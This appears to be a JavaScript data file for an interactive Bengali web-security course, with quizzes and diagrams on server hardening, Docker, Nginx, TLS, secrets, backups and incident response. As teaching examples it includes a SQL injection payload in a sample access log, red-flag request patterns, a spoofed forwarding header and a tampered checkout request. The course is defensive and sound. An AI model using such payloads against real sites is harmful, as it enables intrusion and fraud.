      ['www-data', 'Group', 'কোন group।'],
      ['  app.sh', ''],
    ], note: 'সংখ্যায়: rwx=7, r-x=5, ---=0 → chmod 750' } },
    2: { ask: ask('তোমার Node.js app root হিসেবে চলছে, আর তাতে একটা RCE bug আছে। Attacker কী পাবে?', ['পুরো server-এর root নিয়ন্ত্রণ', 'শুধু app-এর folder', 'কিছুই না'], 0, 'App যে user হিসেবে চলে, attacker-ও ঠিক সেই ক্ষমতা পায়। তাই আলাদা, ক্ষমতাহীন user (Least Privilege) — bug থাকলেও ক্ষতি সীমিত।') },
  },
  ssh: {
    1: { seq: { title: 'SSH key authentication — private key কখনো তারে যায় না', actors: [['💻', 'তোমার laptop'], ['🖥️', 'Server']], msgs: [
      [0, 1, 'আমি deploy; আমার public key এটা', 'Client জানায় কোন key দিয়ে ঢুকতে চায়।'],
      [1, 1, 'authorized_keys-এ আছে?', 'Server দেখে এই public key অনুমোদিত তালিকায় আছে কি না।'],
      [1, 0, 'challenge: এটায় সই করো', 'থাকলে server একটি random চ্যালেঞ্জ পাঠায়।'],
      [0, 0, 'private key দিয়ে সই', 'সই হয় তোমার laptop-এর ভেতরেই। Private key কোথাও যায় না।', 'good'],
      [0, 1, 'signature', 'শুধু সইটা যায়।'],
      [1, 0, '✓ স্বাগতম', 'Server public key দিয়ে সই যাচাই করে। অনুমান করার মতো কোনো password-ই নেই — brute-force অর্থহীন।', 'good'],
    ] } },
    3: { ask: ask('SSH port 22 থেকে 2222-এ সরালে কী লাভ?', ['Log-এর শব্দ কমে, কিন্তু এটা আসল নিরাপত্তা নয়', 'Server পুরোপুরি নিরাপদ হয়ে যায়', 'Brute-force অসম্ভব হয়ে যায়'], 0, 'Scanner কয়েক সেকেন্ডে সব port খুঁজে ফেলে। আসল সুরক্ষা: key-only login, root login বন্ধ, fail2ban, আর সম্ভব হলে firewall/VPN-এর আড়ালে।') },
  },
  firewall: {
    0: { anatomy: { title: 'nmap output — attacker তোমার server-এ যা দেখে', parts: [
      ['22/tcp   open  ssh\n', 'SSH', 'খোলা থাকা স্বাভাবিক — তবে শুধু key দিয়ে, সম্ভব হলে নির্দিষ্ট IP থেকে।'],
      ['443/tcp  open  https\n', 'HTTPS', 'এটাই তোমার একমাত্র সত্যিকারের public দরজা হওয়া উচিত।', 'good'],
      ['5432/tcp open  postgresql\n', 'Database!', 'Internet-এ খোলা database — bot কয়েক ঘণ্টার মধ্যে brute-force শুরু করবে।', 'bad'],
      ['6379/tcp open  redis', 'Redis!', 'Password ছাড়া Redis খোলা থাকলে সেটা সরাসরি server দখলের পথ।', 'bad'],
    ] } },
    2: { seq: { title: 'Docker কীভাবে UFW-কে পাশ কাটায়', actors: [['🌍', 'Internet'], ['🧱', 'UFW (INPUT chain)'], ['🐳', 'Docker (iptables NAT)'], ['🗄️', 'Postgres container']], msgs: [
      [1, 1, 'ufw default deny ✓', 'তুমি নিশ্চিন্ত: 22, 80, 443 ছাড়া সব বন্ধ।'],
      [2, 2, 'docker run -p 5432:5432', 'Docker নিজে থেকেই iptables-এর NAT table-এ নিয়ম বসায় — যা UFW-র নিয়মের আগেই কাজ করে।', 'bad'],
      [0, 2, 'connect :5432', 'বাইরের packet আসে…'],
      [2, 3, 'সরাসরি container-এ', '…আর UFW-র INPUT chain কখনো ছোঁয়ই না। `ufw status`-এ সব ঠিক দেখায়, অথচ database খোলা।', 'bad'],
      [2, 2, '-p 127.0.0.1:5432:5432', 'সমাধান: শুধু loopback-এ publish করো, অথবা port একদমই publish না করে Docker network ব্যবহার করো।', 'good'],
    ] } },
    3: { seq: { title: 'Cloudflare-only origin', actors: [['🧑', 'User'], ['☁️', 'Cloudflare'], ['🖥️', 'Origin server'], ['😈', 'Attacker']], msgs: [
      [0, 1, 'https://shop.example', 'সাধারণ user DNS অনুযায়ী Cloudflare-এ যায়।'],
      [1, 2, 'CF-এর IP থেকে → :443', 'Origin firewall শুধু Cloudflare-এর IP range-কে 443-এ ঢুকতে দেয়।', 'good'],
      [3, 2, 'সরাসরি origin IP → :443', 'Attacker কোনোভাবে আসল IP জেনে WAF এড়িয়ে সরাসরি আসতে চায়…'],
      [2, 3, '✖ DROP', '…কিন্তু তার IP allowlist-এ নেই। WAF ও DDoS সুরক্ষা আর পাশ কাটানো যায় না।', 'good'],
    ] } },
  },
  nginx: {
    0: { ask: ask('Nginx-এ `server_tokens off;` কী করে?', ['Error page ও header থেকে Nginx-এর version লুকায়', 'সব token-ভিত্তিক login বন্ধ করে', 'HTTPS চালু করে'], 0, 'হুবহু version জানা থাকলে attacker সরাসরি সেই version-এর CVE খোঁজে। এটা একা সুরক্ষা নয়, কিন্তু বিনামূল্যের একটি স্তর।') },
    2: { seq: { title: 'Client-এর আসল IP — কোন header বিশ্বাস করবে?', actors: [['🧑', 'User 1.2.3.4'], ['☁️', 'Cloudflare'], ['🔀', 'Nginx'], ['😈', 'Attacker']], msgs: [
      [0, 1, 'request', 'User-এর আসল IP 1.2.3.4।'],
      [1, 2, 'CF-Connecting-IP: 1.2.3.4', 'Nginx-এর কাছে connection আসে Cloudflare-এর IP থেকে; আসল IP থাকে header-এ।'],
      [2, 2, 'set_real_ip_from <CF range>', 'Nginx এই header মানবে শুধু তখনই, যখন connection সত্যিই Cloudflare-এর IP থেকে এসেছে।', 'good'],
      [3, 2, 'X-Forwarded-For: 127.0.0.1', 'Attacker সরাসরি এসে নিজেই header বানিয়ে দিল। অন্ধভাবে বিশ্বাস করলে সে rate limit আর IP allowlist — দুটোই পাশ কাটাবে।', 'bad'],
    ] } },
  },
  docker: {
    1: { bars: { title: 'একই Node.js app, ভিন্ন base image — আকার (আনুমানিক)', scale: 'sqrt', items: [['node:22 (পুরো OS + tools)', 1100, '~১.১ GB', 'bad'], ['node:22-slim', 230, '~২৩০ MB'], ['node:22-alpine', 160, '~১৬০ MB'], ['distroless/nodejs22', 130, '~১৩০ MB', 'good']], note: 'ছোট image মানে শুধু দ্রুত deploy নয় — ভেতরে shell, curl, package manager না থাকলে ঢুকে পড়া attacker-এর হাতে কোনো হাতিয়ারও থাকে না।' } },
    2: { ask: ask('`docker run --privileged` দিয়ে চালানো container-এ attacker ঢুকলে কী হয়?', ['সে সহজেই host machine-এর root হতে পারে', 'Container-এর ভেতরেই আটকে থাকে', 'Docker নিজে থেকে container বন্ধ করে দেয়'], 0, '--privileged প্রায় সব isolation খুলে দেয় — host-এর device ও kernel হাতের মুঠোয়। একইভাবে /var/run/docker.sock mount করাও host-এর root দিয়ে দেওয়ার সমান।') },
  },
  ddos: {
    0: { bars: { title: 'কেন একা সামলানো অসম্ভব (উদাহরণ সংখ্যা)', scale: 'sqrt', items: [['তোমার স্বাভাবিক traffic', 200, '২০০ req/s', 'good'], ['তোমার server-এর সর্বোচ্চ ক্ষমতা', 2000, '২,০০০ req/s'], ['একটি মাঝারি botnet আক্রমণ', 500000, '৫,০০,০০০ req/s', 'bad']], note: 'এই ফারাক আরও server কিনে মেটানো যায় না — দরকার এমন network, যার ক্ষমতা আক্রমণের চেয়েও বড় (Cloudflare-এর মতো CDN)।' } },
    2: { seq: { title: 'Origin IP ফাঁস — Cloudflare-কে পাশ কাটিয়ে আঘাত', actors: [['😈', 'Attacker'], ['📒', 'পুরনো DNS record / mail header'], ['☁️', 'Cloudflare'], ['🖥️', 'Origin']], msgs: [
      [0, 1, 'history খোঁজা', 'Cloudflare-এ আসার আগের A record, direct.shop.example-এর মতো subdomain, বা server থেকে পাঠানো email-এর header।'],
      [1, 0, 'origin IP: 203.0.113.9', 'আসল IP পাওয়া গেল।', 'bad'],
      [0, 3, '🌊 সরাসরি flood', 'Attacker Cloudflare-কে ছুঁলই না — সোজা origin-এ আঘাত। সব সুরক্ষা অর্থহীন।', 'bad'],
      [2, 2, '(কিছুই দেখছে না)', 'প্রতিকার: origin firewall-এ শুধু Cloudflare IP, আর সম্ভব হলে ফাঁস হওয়া IP বদলে ফেলা।'],
    ] } },
  },
  tls: {
    0: { seq: { title: 'Cloudflare “Flexible” mode — তালা দেখায়, কিন্তু অর্ধেক পথ খোলা', actors: [['🧑', 'User'], ['☁️', 'Cloudflare'], ['🖥️', 'Origin']], msgs: [
      [0, 1, 'HTTPS 🔒', 'Browser-এ তালার চিহ্ন — user নিশ্চিন্ত।', 'good'],
      [1, 2, 'HTTP (plain text!)', 'কিন্তু Cloudflare থেকে তোমার server পর্যন্ত কোনো encryption নেই। পথের যে কেউ password পড়তে পারে।', 'bad'],
      [1, 2, 'Full (strict): HTTPS + certificate যাচাই', 'সঠিক mode: origin-এ বৈধ certificate (Cloudflare Origin CA বা Let\'s Encrypt), আর Cloudflare সেটা যাচাই করে।', 'good'],
    ] } },
    1: { ask: ask('HSTS header browser-কে কী করতে বলে?', ['এই site-এ ভবিষ্যতে সবসময় শুধু HTTPS ব্যবহার করতে', 'Cookie encrypt করতে', 'Certificate নিজে থেকে renew করতে'], 0, 'একবার HSTS দেখার পর browser http:// লিখলেও নিজেই https:// করে নেয় — ফলে প্রথম request-এ SSL-strip আক্রমণের সুযোগ থাকে না।') },
  },
  // ───────── Phase 5
  postgres: {
    0: { ask: ask('তোমার web app-এর database user-এর কি DROP TABLE করার অনুমতি দরকার?', ['না — শুধু নিজের table-এ SELECT/INSERT/UPDATE/DELETE', 'হ্যাঁ, নইলে app চলবে না', 'হ্যাঁ, superuser হলে সবচেয়ে সহজ'], 0, 'App-এ SQL injection থাকলে attacker ঠিক ততটুকুই পারবে, যতটুকু ওই DB user পারে। Migration-এর জন্য আলাদা user রাখো।') },
    2: { anatomy: { title: 'pg_hba.conf-এর একটি লাইন — কে, কোথা থেকে, কীভাবে', parts: [
      ['hostssl', 'সংযোগের ধরন', 'শুধু TLS দিয়ে আসা TCP সংযোগ। “host” লিখলে plain text-ও চলত।', 'good'],
      ['  ', ''],
      ['appdb', 'Database', 'শুধু এই একটি database — “all” নয়।'],
      ['  ', ''],
      ['app_user', 'User', 'শুধু এই একটি role।'],
      ['  ', ''],
      ['10.0.0.5/32', 'কোথা থেকে', 'শুধু app server-এর IP। এখানে 0.0.0.0/0 লেখা মানে পুরো internet-কে আমন্ত্রণ।', 'good'],
      ['  ', ''],
      ['scram-sha-256', 'Auth পদ্ধতি', 'আধুনিক password hashing। “trust” মানে password ছাড়াই ঢোকা — production-এ কখনো নয়।', 'good'],
    ] } },
  },
  redis: {
    1: { anatomy: { title: 'redis.conf — চারটি লাইনে মূল সুরক্ষা', parts: [
      ['bind 127.0.0.1\n', 'Bind', 'শুধু নিজের machine থেকে। Default-এ অনেক পুরনো setup সব interface-এ শোনে।', 'good'],
      ['protected-mode yes\n', 'Protected mode', 'Password ছাড়া বাইরের সংযোগ প্রত্যাখ্যান।', 'good'],
      ['requirepass <লম্বা-random>\n', 'Password', 'Redis প্রতি সেকেন্ডে লাখো অনুমান যাচাই করতে পারে — তাই ছোট password অর্থহীন।', 'good'],
      ['rename-command FLUSHALL ""', 'বিপজ্জনক command বন্ধ', 'FLUSHALL, CONFIG, KEYS-এর মতো command নিষ্ক্রিয় করো বা ACL দিয়ে সীমিত করো।', 'good'],
    ] } },
  },
  secrets: {
    0: { ask: ask('ভুল করে .env commit করে ফেলেছ; পরের commit-এ file-টা মুছে দিলে। Secret কি এখন নিরাপদ?', ['না — git history-তে চিরকাল থেকে যায়', 'হ্যাঁ, মুছে তো দিয়েছি', 'হ্যাঁ, repo private হলে'], 0, 'Git কিছুই ভোলে না, আর bot কয়েক সেকেন্ডে public repo ঘেঁটে key খুঁজে নেয়। একমাত্র সমাধান: key-টা সাথে সাথে rotate (বাতিল করে নতুন) করা।') },
    1: { anatomy: { title: 'Frontend-এ একটা prefix-ই সব বদলে দেয় (Next.js-এর উদাহরণ; Vite-এ VITE_)', parts: [
      ['NEXT_PUBLIC_', 'বিপজ্জনক prefix', 'এই prefix মানে: “build-এর সময় এই মান JavaScript bundle-এ বসিয়ে browser-এ পাঠাও।” পৃথিবীর সবাই DevTools-এ দেখতে পাবে।', 'bad'],
      ['STRIPE_KEY', 'নাম', 'নামে কিছু যায় আসে না — prefix-ই ঠিক করে কে দেখবে।'],
      ['=', ''],
      ['sk_live_51Hx…', 'Secret key', 'এটা server-এর secret। prefix-টা বাদ দাও, আর শুধু server component, route handler বা backend থেকে ব্যবহার করো।', 'bad'],
    ] } },
  },
  encryption: {
    0: { ask: ask('Base64 করা password কি নিরাপদ?', ['না — Base64 শুধু encoding, যে কেউ উল্টে ফেলতে পারে', 'হ্যাঁ, পড়া তো যায় না', 'হ্যাঁ, যদি দুইবার করা হয়'], 0, 'Encoding = রূপ বদল (কোনো চাবি নেই)। Encryption = চাবি দিয়ে তালা, চাবি থাকলে খোলা যায়। Hashing = একমুখী, ফেরানো যায় না। Password-এর জন্য দরকার শেষেরটা।') },
    1: { bars: { title: 'একটি GPU প্রতি সেকেন্ডে কতগুলো password অনুমান যাচাই করতে পারে (আনুমানিক)', scale: 'log', items: [['MD5', 10000000000, '~১০০০ কোটি', 'bad'], ['SHA-256', 3000000000, '~৩০০ কোটি', 'bad'], ['bcrypt (cost 12)', 1000, '~১ হাজার', 'good'], ['argon2id', 50, '~কয়েক ডজন', 'good']], note: 'দ্রুত hash password-এর শত্রু। bcrypt/argon2 ইচ্ছে করেই ধীর — বৈধ login-এ ১০০ ms কিছুই না, কিন্তু attacker-এর শত কোটি অনুমানে তা শতাব্দী।' } },
  },
  backup: {
    0: { ask: ask('Ransomware তোমার server-এর সব file encrypt করে ফেলেছে। Backup-ও যদি একই server-এর disk-এ থাকে?', ['Backup-ও encrypt হয়ে গেছে — সব শেষ', 'Backup নিরাপদ থাকবে', 'Ransomware backup চেনে না'], 0, 'যে backup-এ আক্রান্ত server থেকে লেখা বা মোছা যায়, সেটা backup নয়। অন্তত একটি copy রাখো অন্য জায়গায়, আর একটি এমন যা বদলানো যায় না (immutable/offline)।') },
    2: { anatomy: { title: 'দুর্ঘটনার timeline — RPO আর RTO', parts: [
      ['🕛 শেষ backup', 'রাত ১২টা', 'সর্বশেষ সফল backup।'],
      [' ←── ', ''],
      ['RPO', 'কতটা data হারাবে', 'শেষ backup থেকে দুর্ঘটনা পর্যন্ত সময়। দিনে একবার backup = সর্বোচ্চ ২৪ ঘণ্টার data হারানো।', 'bad'],
      [' ──→ ', ''],
      ['💥 দুর্ঘটনা', 'সকাল ৯টা', 'এখানে ৯ ঘণ্টার order ও payment হারাল।', 'bad'],
      [' ←── ', ''],
      ['RTO', 'কতক্ষণ বন্ধ থাকবে', 'আবার চালু হতে যত সময় লাগে। Restore কখনো পরীক্ষা না করলে এই সংখ্যাটা তুমি জানোই না।'],
      [' ──→ ', ''],
      ['✅ আবার চালু', 'দুপুর ১টা', 'RTO হলো ৪ ঘণ্টা।', 'good'],
    ] } },
  },
  // ───────── Phase 6
  headers: {
    0: { anatomy: { title: 'পাঁচটি header — browser-কে দেওয়া পাঁচটি নির্দেশ', parts: [
      ['Content-Security-Policy: default-src \'self\'\n', 'CSP', '“শুধু আমার নিজের domain-এর script, style ও ছবি চালাবে।” XSS ঢুকলেও attacker-এর script চলবে না।'],
      ['Strict-Transport-Security: max-age=31536000\n', 'HSTS', '“আগামী এক বছর আমার কাছে শুধু HTTPS-এ আসবে।”'],
      ['X-Frame-Options: DENY\n', 'Frame সুরক্ষা', '“আমাকে কারো iframe-এ দেখাবে না।” — clickjacking বন্ধ।'],
      ['X-Content-Type-Options: nosniff\n', 'nosniff', '“File-এর ধরন অনুমান করবে না; আমি যা বলেছি তাই।” — ছবির ছদ্মবেশে script চালানো বন্ধ।'],
      ['Referrer-Policy: strict-origin-when-cross-origin', 'Referrer', '“অন্য site-এ গেলে পুরো URL নয়, শুধু আমার domain জানাবে।” — URL-এর ভেতরের token ফাঁস রোধ।'],
    ] } },
    1: { ask: ask('CSP-তে `script-src \'self\' \'unsafe-inline\'` লিখলে কী হারাও?', ['Inline <script> আবার চলে — XSS সুরক্ষা প্রায় শূন্য', 'কিছুই না', 'শুধু ছবি load বন্ধ হয়'], 0, 'XSS-এর বেশিরভাগ payload-ই inline script। unsafe-inline মানে দরজায় তালা লাগিয়ে চাবিটা তালাতেই ঝুলিয়ে রাখা। দরকার হলে nonce ব্যবহার করো।') },
  },
  deps: {
    0: { seq: { title: 'Supply chain attack — তুমি কিছু ভুল করোনি, তবুও…', actors: [['😈', 'Attacker'], ['📦', 'npm registry'], ['🏗️', 'তোমার CI'], ['🖥️', 'Production']], msgs: [
      [0, 1, 'জনপ্রিয় package-এ malicious update', 'কোনো maintainer-এর account দখল করে, অথবা প্রায় একই নামের package (typosquatting) ছেড়ে।', 'bad'],
      [2, 1, 'npm install', 'তোমার build স্বাভাবিকভাবেই “সর্বশেষ compatible version” নামায়।'],
      [1, 2, 'package + postinstall script', 'Install-এর সময়ই script চলে — CI-এর সব secret তার নাগালে।', 'bad'],
      [2, 3, 'deploy', 'Malware এখন তোমার নিজের app-এর অংশ।', 'bad'],
      [3, 0, 'env secret, user data', 'সব attacker-এর কাছে। প্রতিকার: lockfile commit করো, `npm ci` ব্যবহার করো, আর নিয়মিত audit চালাও।', 'bad'],
    ] } },
    1: { anatomy: { title: 'package.json-এর version চিহ্ন', parts: [
      ['"lodash": "', ''],
      ['^', 'Caret', '“একই major version-এর যেকোনো নতুন version নিতে পারো” — অর্থাৎ কাল install করলে আজকের চেয়ে ভিন্ন code আসতে পারে।', 'bad'],
      ['4', 'Major', 'ভাঙার মতো বড় পরিবর্তন হলে বাড়ে।'],
      ['.17', 'Minor', 'নতুন feature, পুরনো code ভাঙে না।'],
      ['.21', 'Patch', 'Bug ও security fix।'],
      ['"', ''],
    ], note: 'তাই package-lock.json commit করা জরুরি — সেখানে হুবহু version আর integrity hash লেখা থাকে।' } },
  },
  scanning: {
    0: { seq: { title: 'Intercepting proxy — request মাঝপথে থামিয়ে বদলানো', actors: [['🌐', 'Browser'], ['🔧', 'Burp / ZAP'], ['🖥️', 'Server']], msgs: [
      [0, 1, 'POST /checkout  price=1500', 'Browser-এর সব traffic proxy-র ভেতর দিয়ে যায়।'],
      [1, 1, '✋ থামাও → price=1', 'Tester request-টা আটকে হাতে বদলায়। UI-এর সব validation এখানে অর্থহীন।'],
      [1, 2, 'POST /checkout  price=1', 'বদলানো request server-এ যায়।'],
      [2, 1, '200 OK — order confirmed?!', 'Server যদি দামটা নিজে database থেকে না নেয় — bug ধরা পড়ল। ঠিক এভাবেই তোমার নিজের app পরীক্ষা করবে।', 'bad'],
    ] } },
    2: { ask: ask('বন্ধুর website-এ তার অনুমতি ছাড়া একটা scanner চালিয়ে “সাহায্য” করা কি ঠিক?', ['না — লিখিত অনুমতি ছাড়া এটা অবৈধ', 'হ্যাঁ, উদ্দেশ্য তো ভালো', 'হ্যাঁ, যদি কিছু নষ্ট না করি'], 0, 'অনুমতিই ethical hacking আর অপরাধের একমাত্র পার্থক্য। অনুশীলনের জন্য নিজের app, DVWA, Juice Shop বা legal CTF lab ব্যবহার করো।') },
  },
  logs: {
    0: { ask: ask('নিচের কোনটা log-এ কখনো লেখা উচিত নয়?', ['Password ও session token', 'ব্যর্থ login-এর সময় ও IP', 'কোন user কোন admin কাজ করল'], 0, 'Log অনেকের হাতে যায় (developer, log service, backup)। সেখানে secret থাকলে log ফাঁস মানেই account ফাঁস।') },
    1: { anatomy: { title: 'Nginx access log-এর একটি সন্দেহজনক লাইন', parts: [
      ['203.0.113.50', 'কে', 'Client-এর IP। একই IP থেকে অনেক 401/404 = scanner বা brute-force।'],
      [' - - ', ''],
      ['[12/Nov/2026:03:14:07 +0000]', 'কখন', 'রাত ৩টা — মানুষের চেয়ে bot-এর সময়।'],
      [' "', ''],
      ['GET /api/users?id=1\' OR \'1\'=\'1', 'কী চেয়েছে', 'URL-এ SQL injection-এর চিহ্ন। `../`, `<script>`, `/wp-admin`, `/.env` — এগুলোও একই রকম লাল পতাকা।', 'bad'],
      [' HTTP/1.1" ', ''],
      ['200', 'ফলাফল', '200?! তার মানে আক্রমণ হয়তো সফল। 400 বা 403 হলে নিশ্চিন্ত থাকা যেত।', 'bad'],
      [' 48213 ', 'আকার', 'স্বাভাবিকের চেয়ে অনেক বড় response — সম্ভবত অনেক data বেরিয়ে গেছে।', 'bad'],
      ['"sqlmap/1.7"', 'User-Agent', 'আক্রমণের tool নিজের নামই জানিয়ে দিচ্ছে।', 'bad'],
    ] } },
  },
  incident: {
    1: { ask: ask('Server hack হয়েছে বলে সন্দেহ। প্রথম কাজ কোনটা?', ['Network থেকে আলাদা করো, কিন্তু বন্ধ বা মুছো না — প্রমাণ রাখো', 'সাথে সাথে সব মুছে নতুন করে install', 'Reboot করে দেখো ঠিক হয় কি না'], 0, 'মুছে ফেললে বা reboot করলে memory ও log-এর প্রমাণ হারায় — তখন জানাই যাবে না attacker কীভাবে ঢুকেছিল, আর একই পথে সে আবার আসবে। আগে আটকাও (contain), তারপর তদন্ত, তারপর পরিষ্কার।') },
  },
  capstone: {
    0: { layers: { title: 'Defense in depth — পুরো course এক ছবিতে (একটা স্তর ভাঙলেও পরেরটা আটকায়)', items: [
      ['☁️', 'Edge — Cloudflare', 'DDoS শোষণ, WAF, bot ছাঁকা, origin IP লুকানো।'],
      ['🧱', 'Network — Firewall', 'Default deny; শুধু 443 (Cloudflare থেকে) আর SSH (key দিয়ে)।'],
      ['🔀', 'Proxy — Nginx', 'TLS, security header, rate limit, request-এর আকার সীমা।'],
      ['⚙️', 'App — Node.js / React', 'Input validation, authentication, প্রতিটি request-এ authorization, parameterized query, output escaping।'],
      ['🗄️', 'Data — PostgreSQL / Redis', 'Least privilege role, শুধু private network, password hashing, secret আলাদা জায়গায়।'],
      ['🛟', 'Recovery — Backup, Log, Monitoring', 'সব স্তর ভাঙলেও: টের পাও (alert), বোঝো (log), আর ফিরে আসো (পরীক্ষিত backup)।'],
    ] } },
    1: { ask: ask('Audit report-এ একটি finding লিখছ। কোন অংশটা ছাড়া developer সেটা ঠিক করতে পারবে না?', ['ধাপে ধাপে reproduce করার উপায় ও নির্দিষ্ট সমাধান', 'একটা ভয়ংকর শিরোনাম', 'Scanner-এর পুরো raw output'], 0, 'ভালো finding = কী সমস্যা, কোথায়, কীভাবে আবার ঘটানো যায়, কী ক্ষতি হতে পারে, আর কীভাবে ঠিক করতে হবে। বাকিটা শুধু শব্দ।') },
  },
};
